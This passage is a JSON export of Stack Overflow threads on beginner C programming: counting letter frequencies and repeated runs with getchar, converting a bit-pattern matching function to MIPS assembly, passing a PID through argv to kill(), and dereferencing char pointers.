2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "edited": false, "score": 0, "creation_date": 1517988242, "post_id": 48657970, "comment_id": 84313733, "body": "I wonder how to <i>change the printf statement</i> to make <i>212</i> out of <i>4 1</i>."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "edited": false, "score": 0, "creation_date": 1517988627, "post_id": 48657970, "comment_id": 84313905, "body": "See updated answer. The coding issue is determining <i>frequency</i>, how you want to output it is trivial."}, {"owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "edited": false, "score": 0, "creation_date": 1517989403, "post_id": 48657970, "comment_id": 84314306, "body": "I wonder why you refuse to feed the example input <code>xxyxx</code> to your program in order to see its output differ from the expected one."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "edited": false, "score": 0, "creation_date": 1517989668, "post_id": 48657970, "comment_id": 84314434, "body": "No, I see what you are saying now, the <code>xxyxx</code> isn&#39;t intended to get the frequency but rather the sequential duplicate count. Updated again. More to learn here."}], "tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": false, "score": 1, "last_activity_date": 1517989596, "last_edit_date": 1517989596, "creation_date": 1517987628, "answer_id": 48657970, "question_id": 48656303, "link": "https://stackoverflow.com/questions/48656303/c-programming-how-to-count-number-of-repetition-of-letter-in-a-word/48657970#48657970", "title": "C programming - How to count number of repetition of letter in a word", "body": "<p>What you are describing is classically handled using a <em>frequency array</em> that is simply an array with the number of elements equal to the number of items you want to count the frequency of (e.g. <code>26</code> for all lowercase characters). The array is initialized to all zero. You then map each member of the set you want the frequency of to an array index. (for lowercase characters this is particularly easy since you can map <code>ch - 'a'</code> to map each character <code>a to z</code> to array index <code>0 - 25</code> (e.g. <code>'a' - 'a' = 0</code>, <code>'b' - 'a' = 1</code>, etc...</p>\n\n<p>Then it is just a matter of looping over all characters on <code>stdin</code> checking if they are one in the set you want the frequency of (e.g. a lowercase character) and incrementing the array index that corresponds to that character. For example if you read all characters with <code>c = getchar();</code>, then you would test and increment as follows:</p>\n\n<pre><code>#define NLOWER 26   /* if you need a constant, define one */\n...\n    int c,                              /* var to hold each char */\n        charfreq[NLOWER] = {0};         /* frequency array */\n    ...\n        if ('a' &lt;= c &amp;&amp; c &lt;= 'z')       /* is it a lowercase char ? */\n            charfreq[c - 'a']++;        /* update frequency array  */\n</code></pre>\n\n<p>When your are done reading characters, then the frequency of each character is captured in your frequency array (e.g. <code>charfreq[0]</code> holds the number of <code>'a'</code>, <code>charfreq[1]</code> holds the number of <code>'b'</code>, etc...)</p>\n\n<p>Putting it altogether you could do something similar to:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#define NLOWER 26   /* if you need a constant, define one */\n\nint main (void) {\n\n    int c,                              /* var to hold each char */\n        charfreq[NLOWER] = {0},         /* frequency array */\n        i;                              /* loop var i */\n\n    while ((c = getchar()) != EOF )     /* loop over each char */\n        if ('a' &lt;= c &amp;&amp; c &lt;= 'z')       /* is it a lowercase char ? */\n            charfreq[c - 'a']++;        /* update frequency array  */\n\n    /* output results */\n    printf (\"\\ncharacter frequency is:\\n\");\n\n    for (i = 0; i &lt; NLOWER; i++)\n        if (charfreq[i])\n            printf (\" %c : %2d\\n\", 'a' + i, charfreq[i]);\n\n    return 0;\n}\n</code></pre>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>$ echo \"my dog has xxxyyyzzzz fleas\" | ./bin/freqofcharstdin\n\ncharacter frequency is:\n a :  2\n d :  1\n e :  1\n f :  1\n g :  1\n h :  1\n l :  1\n m :  1\n o :  1\n s :  2\n x :  3\n y :  4\n z :  4\n</code></pre>\n\n<p>Look things over and let me know if you have questions. This is a fundamental frequency tracking scheme you will use over and over again in many different circumstances.</p>\n\n<hr>\n\n<p><strong>Outputting All Frequencies Sequentially</strong></p>\n\n<p>With changes to the <code>printf</code> only, you can output the frequencies as a string of integers instead of nicely formatted tabular output, e.g.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#define NLOWER 26   /* if you need a constant, define one */\n\nint main (void) {\n\n    int c,                              /* var to hold each char */\n        charfreq[NLOWER] = {0},         /* frequency array */\n        i;                              /* loop var i */\n\n    while ((c = getchar()) != EOF )     /* loop over each char */\n        if ('a' &lt;= c &amp;&amp; c &lt;= 'z')       /* is it a lowercase char ? */\n            charfreq[c - 'a']++;        /* update frequency array  */\n\n    /* output results */\n    printf (\"\\ncharacter frequency is:\\n\");\n\n    for (i = 0; i &lt; NLOWER; i++)\n        if (charfreq[i])\n#ifdef SEQUENTIALOUT\n            printf (\"%d\", charfreq[i]);\n            putchar ('\\n');\n#else\n            printf (\" %c : %2d\\n\", 'a' + i, charfreq[i]);\n#endif\n\n    return 0;\n}\n</code></pre>\n\n<p><strong>Compile with <code>SEQUENTIALOUT</code> defined</strong></p>\n\n<pre><code>$ gcc -Wall -Wextra -pedantic -std=gnu11 -Ofast -DSEQUENTIALOUT \\\n  -o bin/freqofcharstdin freqofcharstdin.c\n</code></pre>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>$ echo \"my dog has xxxyyyzzzz fleas\" | ./bin/freqofcharstdin\n\ncharacter frequency is:\n2111111112344\n</code></pre>\n\n<p>or for the exact string and output in question:</p>\n\n<pre><code>$ echo \"xxxyyyzzzz\" | ./bin/freqofcharstdin\n\ncharacter frequency is:\n334\n</code></pre>\n\n<hr>\n\n<p><strong>Sequential Duplicate Characters</strong></p>\n\n<p>If I misunderstood your question and you do not want the frequency of occurrence, but instead you want the <em>count of sequential duplicate characters</em>, then you can do something simple like the following:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#define NLOWER 26   /* if you need a constant, define one */\n\nint main (void) {\n\n    int c,                              /* var to hold each char */\n        prev = 0,                       /* var to hold previous char */\n        count = 1;                      /* sequential count */\n\n    while ((c = getchar()) != EOF) {    /* loop over each char */\n        if (prev) {                     /* does prev contain a char ? */\n            if (prev == c)              /* same as last ? */\n                count++;                /* imcrement count */\n            else {                      /* chars differ */\n                printf (\"%d\", count);   /* output count */\n                count = 1;              /* reset count */\n            }\n        }\n        prev = c;                       /* save c as prev */\n    }\n    putchar ('\\n');\n\n    return 0;\n}\n</code></pre>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>$ echo \"xxyxx\" | ./bin/sequentialduplicates\n212\n\n$ echo \"xxxyyyzzzz\" | ./bin/sequentialduplicates\n334\n</code></pre>\n"}], "owner": {"reputation": 59, "user_id": 9323869, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/29f889c966e86ccc640fa9208abfaf3e?s=128&d=identicon&r=PG&f=1", "display_name": "holahola", "link": "https://stackoverflow.com/users/9323869/holahola"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2325, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1517991414, "creation_date": 1517979530, "last_edit_date": 1517980514, "question_id": 48656303, "link": "https://stackoverflow.com/questions/48656303/c-programming-how-to-count-number-of-repetition-of-letter-in-a-word", "title": "C programming - How to count number of repetition of letter in a word", "body": "<p>I am trying to write a program where its supposed to count the occurrence of each characters using <code>getchar()</code>. For example if the input is <code>xxxyyyzzzz</code> the output should be <code>334</code> (x is repeated 3 times, y 3 and z 4times). If the input is <code>xxyxx</code> the output should be <code>212</code>.</p>\n\n<p>Here's what I have tried so far:</p>\n\n<pre><code>double nc ;\nfor (nc=0 ; getchar()!=EOF;++nc);\nprintf (\"%.0f\\n\",nc);\nreturn 0;\n</code></pre>\n\n<p>Input <code>aaabbbccc</code>, output <code>10</code>. The expected out put is <code>333</code></p>\n\n<p>Unfortunately , this shows the total number of characters including enter but not the  repetition.</p>\n"}, {"tags": ["c", "assembly", "mips", "mips32", "language-translation"], "answers": [{"comments": [{"owner": {"reputation": 89, "user_id": 4949878, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh6.googleusercontent.com/-KMPv0CdlkS8/AAAAAAAAAAI/AAAAAAAABtA/ct-iR8MaQE0/photo.jpg?sz=128", "display_name": "Landon Haugh", "link": "https://stackoverflow.com/users/4949878/landon-haugh"}, "edited": false, "score": 0, "creation_date": 1517979903, "post_id": 48656312, "comment_id": 84310433, "body": "I mean, yea. I get that part. What I don&#39;t understand is that if I have 2 binary numbers (11110000111100001111000011110000, 00000000000000000000000011110000), this code ends up making u32_result = 4, since there are 4 matching 1&#39;s in the two binary numbers. I feel like I would have to shift right bit by bit and check whether or not the LSB&#39;s are matching. I don&#39;t understand how to do that."}, {"owner": {"reputation": 513, "user_id": 8293226, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ccfWx.png?s=128&g=1", "display_name": "mustachioed", "link": "https://stackoverflow.com/users/8293226/mustachioed"}, "reply_to_user": {"reputation": 89, "user_id": 4949878, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh6.googleusercontent.com/-KMPv0CdlkS8/AAAAAAAAAAI/AAAAAAAABtA/ct-iR8MaQE0/photo.jpg?sz=128", "display_name": "Landon Haugh", "link": "https://stackoverflow.com/users/4949878/landon-haugh"}, "edited": false, "score": 1, "creation_date": 1517980084, "post_id": 48656312, "comment_id": 84310479, "body": "@LandonHaugh I can&#39;t really do your assignment for you. This has to be done and understood by you. I can&#39;t do much to help you without also helping you cheat. :L"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 1, "creation_date": 1517981298, "post_id": 48656312, "comment_id": 84310857, "body": "The two of you might be interested in the compromise described here. <a href=\"https://meta.stackoverflow.com/questions/334822/how-do-i-ask-and-answer-homework-questions\" title=\"how do i ask and answer homework questions\">meta.stackoverflow.com/questions/334822/&hellip;</a>"}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "reply_to_user": {"reputation": 89, "user_id": 4949878, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh6.googleusercontent.com/-KMPv0CdlkS8/AAAAAAAAAAI/AAAAAAAABtA/ct-iR8MaQE0/photo.jpg?sz=128", "display_name": "Landon Haugh", "link": "https://stackoverflow.com/users/4949878/landon-haugh"}, "edited": false, "score": 0, "creation_date": 1517991107, "post_id": 48656312, "comment_id": 84315092, "body": "@LandonHaugh The function does not count matching 1s. Therefore you don&#39;t need to shift."}, {"owner": {"reputation": 18763, "user_id": 472495, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/4rtxd.png?s=128&g=1", "display_name": "halfer", "link": "https://stackoverflow.com/users/472495/halfer"}, "edited": false, "score": 0, "creation_date": 1518035127, "post_id": 48656312, "comment_id": 84343529, "body": "An upvote for encouraging the OP to try again after a hint."}], "tags": [], "owner": {"reputation": 513, "user_id": 8293226, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ccfWx.png?s=128&g=1", "display_name": "mustachioed", "link": "https://stackoverflow.com/users/8293226/mustachioed"}, "is_accepted": false, "score": 1, "last_activity_date": 1517979559, "creation_date": 1517979559, "answer_id": 48656312, "question_id": 48656163, "link": "https://stackoverflow.com/questions/48656163/how-to-convert-c-code-to-mips-assembly/48656312#48656312", "title": "How to convert C code to MIPS assembly?", "body": "<p>I'm not going to do your whole assignment for you but here's what the code does.</p>\n\n<pre><code>if((*pu32_a &amp; u32_pat) == u32_pat) u32_result++;\n</code></pre>\n\n<p>The first significant chunk is this:</p>\n\n<pre><code>(*pu32_a &amp; u32_pat)\n</code></pre>\n\n<p>It involves de-referencing a pointer variable named <code>pu32_a</code>. This is then ANDed with another variable named <code>u32_pat</code>. The next chunk is as follows.</p>\n\n<pre><code> == u32_pat) u32_result++;\n</code></pre>\n\n<p>This chunk compares result of the AND operation to the variable named <code>u32_pat</code>. If it is equal the variable named <code>u32_result</code> is incremented by one.</p>\n"}], "owner": {"reputation": 89, "user_id": 4949878, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh6.googleusercontent.com/-KMPv0CdlkS8/AAAAAAAAAAI/AAAAAAAABtA/ct-iR8MaQE0/photo.jpg?sz=128", "display_name": "Landon Haugh", "link": "https://stackoverflow.com/users/4949878/landon-haugh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 537, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1518035046, "creation_date": 1517978661, "last_edit_date": 1518035046, "question_id": 48656163, "link": "https://stackoverflow.com/questions/48656163/how-to-convert-c-code-to-mips-assembly", "title": "How to convert C code to MIPS assembly?", "body": "<p>I'm currently writing a program for a class that requires me to convert a C program to MIPS assembly. The premise is to take two hex values and see how many 1's match up in binary. For instance, here is the C code:</p>\n\n<pre><code>// Count the number of items that match the pattern (have '1' bits in \n// the same place as the pattern)\n// pu32_a points to the first element of the array\n// u32_n is the number of elements in the array\n// u32_pat is the pattern to match\n\nuint32_t pmatch(uint32_t* pu32_a, uint32_t u32_n, uint32_t u32_pat) {\n\n  uint32_t u32_result;\n\n  u32_result = 0;\n  while(u32_n != 0) {\n    if((*pu32_a &amp; u32_pat) == u32_pat) u32_result++;\n    pu32_a++;\n    u32_n--;\n  }\n\nreturn u32_result;\n\n}\n\nuint32_t au32_k[] = {0x80000000, 0xFFFFFFFF, 0x0000A5AA, 0xF0F0F0F0};\nuint32_t u32_count;\n\nmain() {\n\n  u32_count = pmatch(au32_k, 4, 0x0000000F0);\n  printf(\"Number of matches is: %d \\n\", u32_count);\n\n}  \n</code></pre>\n\n<p>And here is my current assembly code:    </p>\n\n<pre><code>#\n#\n# au32_k = {0x80000000, 0xFFFFFFFF,\n#       0x0000A5AA, 0xF0F0F0F0}\n#\n#\n\n         .data\nau32_k:  .space 16\nu32_n:   .word  4\nu32_pat: .word  240\n         .text\n\nmain:\n\n    # Store values in $s# registers\n\n    addi $s0, $zero, 2147483648\n    addi $s1, $zero, 4294967295\n    addi $s2, $zero, 42410\n    addi $s3, $zero, 4042322160\n\n    # Index = $t0\n    # This loads each of the values into an array\n    # starting at index $t0.\n\n    addi $t0, $zero, 0\n    sw   $s0, au32_k($t0)\n    addi $t0, $t0, 4\n    sw   $s1, au32_k($t0)\n    addi $t0, $t0, 4\n    sw   $s2, au32_k($t0)\n    addi $t0, $t0, 4\n    sw   $s3, au32_k($t0)\n\n    # Reset pointer to 0\n\n    addi $t0, $t0, -12\n\n    # Storing values in argument registers for subroutine\n\n    la $a0, au32_k\n    lw $a1, u32_n\n    lw $a2, u32_pat\n    jal pmatch\n\n# This is where I get completely lost.\n\npmatch:\n\n    addi $s0, $zero, 0\n    addi $s1, $zero, 0\n\n    while:\n\n        beqz $a1, while_end\n\n        if_start:\n\n    while_end:\n</code></pre>\n\n<p>I am completely lost on this part in the C code:</p>\n\n<pre><code>if((*pu32_a &amp; u32_pat) == u32_pat) u32_result++;\n</code></pre>\n\n<p>I have no clue on how to convert this to assembly, and quite frankly, have no clue how this counts the number of matching 1 bits in two numbers.</p>\n"}, {"tags": ["c", "pid"], "answers": [{"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1517979891, "post_id": 48656318, "comment_id": 84310431, "body": "Why use <code>atoi()</code>?  Certainly <code>pid_t</code> is not defined to be only as wide as <code>int</code>?  OTOH, it tends to be so: <a href=\"https://stackoverflow.com/q/1922761/2410359\">stackoverflow.com/q/1922761/2410359</a>"}, {"owner": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1517980196, "post_id": 48656318, "comment_id": 84310507, "body": "I think it&#39;s a un unsigned int, but fair point. The OS will actually handle the value wrapping around, and IIRC there is even a way to randomize the assigned PIDs (may require a kernel patch, not sure). Anyways, yeah <code>strtoull</code> would probably be a good idea, I&#39;ll edit the code."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1517980392, "post_id": 48656318, "comment_id": 84310565, "body": "Perhaps signed: <a href=\"http://www.gnu.org/software/libc/manual/html_node/Process-Identification.html\" rel=\"nofollow noreferrer\">Ref</a>"}, {"owner": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1517980520, "post_id": 48656318, "comment_id": 84310603, "body": "Ah, you&#39;re right (POSIX: <a href=\"http://pubs.opengroup.org/onlinepubs/009695399/basedefs/sys/types.h.html\" rel=\"nofollow noreferrer\">pubs.opengroup.org/onlinepubs/009695399/basedefs/sys/&hellip;</a>). I honestly had no idea PIDs could be negative, thanks! I&#39;ll make another edit :)"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1517981217, "post_id": 48656318, "comment_id": 84310831, "body": "Yes the whole &quot;what is the right <code>strto*</code>&quot; to use is a bit tricky with types like <code>pid_t</code>, etc.  One idea to convert the string with widest <code>strtoll()</code> or <code>strtoimax()</code> and then narrow - handling overflow in some TBD fashion.  Another is to compare sizes or MAX value and then call the &quot;right&quot; <code>strto*</code>.  I&#39;d say this answer is good enough for the majority of cases."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1517981306, "post_id": 48656318, "comment_id": 84310859, "body": "You&#39;ll probably want to note whether the signal is sent successfully or not, and report if it isn&#39;t.  That means checking the result of <code>kill()</code>."}], "tags": [], "owner": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "is_accepted": false, "score": 2, "last_activity_date": 1517981266, "last_edit_date": 1517981266, "creation_date": 1517979595, "answer_id": 48656318, "question_id": 48656108, "link": "https://stackoverflow.com/questions/48656108/using-pid-passed-from-argv/48656318#48656318", "title": "Using pid passed from argv", "body": "<p>You need to convert from a string to an integer. Try something like</p>\n\n<pre><code>//initialized as a global variable\npid_t distant_pid;\n\n//in my main function\nlong long int pid_ll = strtoll(argv[1], NULL, 0);\ndistant_pid = (pid_t) pid_ll;\n\n//then, in my signal handler\nkill(distantPid, WARNING_SIGNAL);\n</code></pre>\n\n<p>If this is production code you'll want to make sure <code>strtoll()</code> was successful; I'll leave that as an exercise for you\u2026 see the man page for info about how.</p>\n"}, {"tags": [], "owner": {"reputation": 212, "user_id": 8246573, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yHFVF.jpg?s=128&g=1", "display_name": "Paresh Dhandhukiya", "link": "https://stackoverflow.com/users/8246573/paresh-dhandhukiya"}, "is_accepted": false, "score": 0, "last_activity_date": 1517982201, "creation_date": 1517982201, "answer_id": 48656738, "question_id": 48656108, "link": "https://stackoverflow.com/questions/48656108/using-pid-passed-from-argv/48656738#48656738", "title": "Using pid passed from argv", "body": "<p>convert string to int and pass it to kill command : \nkill(atoi(argv[1]), WARNING_SIGNAL);</p>\n"}], "owner": {"reputation": 1, "user_id": 8180935, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3e21eaafe7c7acf93dda11c421074e3b?s=128&d=identicon&r=PG&f=1", "display_name": "Torin", "link": "https://stackoverflow.com/users/8180935/torin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 429, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1517982201, "creation_date": 1517978252, "question_id": 48656108, "link": "https://stackoverflow.com/questions/48656108/using-pid-passed-from-argv", "title": "Using pid passed from argv", "body": "<p>Currently, I have one file calling another, and as an argument it passes over a pid converted into a string. Then, in a signal handler, I need to send a signal to the process given by the pid.</p>\n\n<p>So I have:</p>\n\n<pre><code>//initialized as a global variable\npid_t* distantPid;\n\n//in my main function\ndistantPid = &amp;argv[1];\n\n//then, in my signal handler\nkill(*distantPid, WARNING_SIGNAL);\n</code></pre>\n\n<p>Whenever I try to compile this, though, I get an error saying 'Assignment from incompatible pointer type [assigned by default]'</p>\n\n<p>I can't simply use argv[1] in the signal handler, because it's not in the main function. </p>\n\n<p>Where am I going wrong?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 0, "creation_date": 1517976385, "post_id": 48655797, "comment_id": 84309512, "body": "do you know how to get a single character from a <code>char*</code> type?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1517976582, "post_id": 48655797, "comment_id": 84309551, "body": "Do you want to pass the single character <code>&#39;H&#39;</code>, or a pointer to it?  If you want to pass a single character, you need to review the signature of <code>strcpy()</code> \u2014 it would be a mistake to pass a single character as the second argument.  What do you know about dereferencing pointers?"}, {"owner": {"reputation": 15, "user_id": 8864197, "user_type": "registered", "profile_image": "https://graph.facebook.com/2170263616332778/picture?type=large", "display_name": "Tyler Gee", "link": "https://stackoverflow.com/users/8864197/tyler-gee"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1517977082, "post_id": 48655797, "comment_id": 84309675, "body": "@JonathanLeffler I know a little bit about dereferencing. It basically gathers a value from a pointer? if i use the code {  strcpy(word, *string_ptr); } I can pass the entire value of the sting to the variable word."}, {"owner": {"reputation": 15, "user_id": 8864197, "user_type": "registered", "profile_image": "https://graph.facebook.com/2170263616332778/picture?type=large", "display_name": "Tyler Gee", "link": "https://stackoverflow.com/users/8864197/tyler-gee"}, "edited": false, "score": 0, "creation_date": 1517977482, "post_id": 48655797, "comment_id": 84309763, "body": "I need to be able to pass a single character, the question requires me to loop over the entire string until a non letter character is reached, convert any uppercase letters to lowercase and then return a single word. then ill have to do this again for the next set of letter characters in the sting."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1517977490, "post_id": 48655797, "comment_id": 84309768, "body": "Right \u2014 <code>strcpy(word, *string_ptr)</code> will copy the string <code>&quot;Hello world&quot;</code> into the array <code>word</code>.  And if you only want to copy one character from a string, consider <code>strncpy()</code>, but don&#39;t forget to null-terminate the result string.  It looks like you&#39;re going to need to update the value in <code>*string_ptr</code> to allow for the characters copied to the return function \u2014 that&#39;s why it needs to be a <code>char **</code> and not just a <code>char *</code>."}, {"owner": {"reputation": 15, "user_id": 8864197, "user_type": "registered", "profile_image": "https://graph.facebook.com/2170263616332778/picture?type=large", "display_name": "Tyler Gee", "link": "https://stackoverflow.com/users/8864197/tyler-gee"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1517977791, "post_id": 48655797, "comment_id": 84309845, "body": "Life saver! @JonathanLeffler! please post an answer and i will mark it for you. I should have gotten this, it is very simple."}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 0, "creation_date": 1517977807, "post_id": 48655797, "comment_id": 84309846, "body": "right. To get a single character, you&#39;ll have to dereference <code>char** string_ptr</code> twice.. first time to get the word, second time to get the character (in this example). Since you want the first character of the first word in this case, <code>char c = **string_ptr;</code> will do it, but that&#39;s a simplified case. To get other characters (or other characters in other words if they existed), you would need to perform some pointer arithmetic before dereferencing. Also take note that a C string much be at least 2 characters (terminated with NUL <code>&#39;\\0&#39;</code>)"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1517977831, "post_id": 48655797, "comment_id": 84309855, "body": "@TylerGee A pointer is simply a variable that holds the address of something else as its value. Where you normally think of a variable holding an immediate value, such as <code>int a = 5;</code>, a pointer would simply hold the address where <code>5</code> was stored, e.g. <code>int *b = &amp;a;</code>. To get the thing stored at the address of <code>a</code> from <code>b</code>, you simply <i>dereference</i> <code>b</code> (e.g. <code>*b</code>), the <code>&#39;*&#39;</code> removes 1-level of address indirection, so rather than giving you what is stored in <code>b</code>, you get the thing stored at the address held by <code>b</code> (e.g. <code>5</code>). Apply that to what you are doing with <code>sentence</code>..."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1518014114, "post_id": 48655797, "comment_id": 84330257, "body": "Not the answer to your problem, but you will probably learn something from <a href=\"/q/605845\">the question on why not to cast the return value of <code>malloc()</code> and family in C</a>.  Also, note that <code>sizeof (char)</code> is always <code>1</code> (as we measure sizes in units of <code>char</code>), so it&#39;s pointless to multiply by it."}], "answers": [{"tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 1, "last_activity_date": 1517980949, "last_edit_date": 1592644375, "creation_date": 1517979931, "answer_id": 48656365, 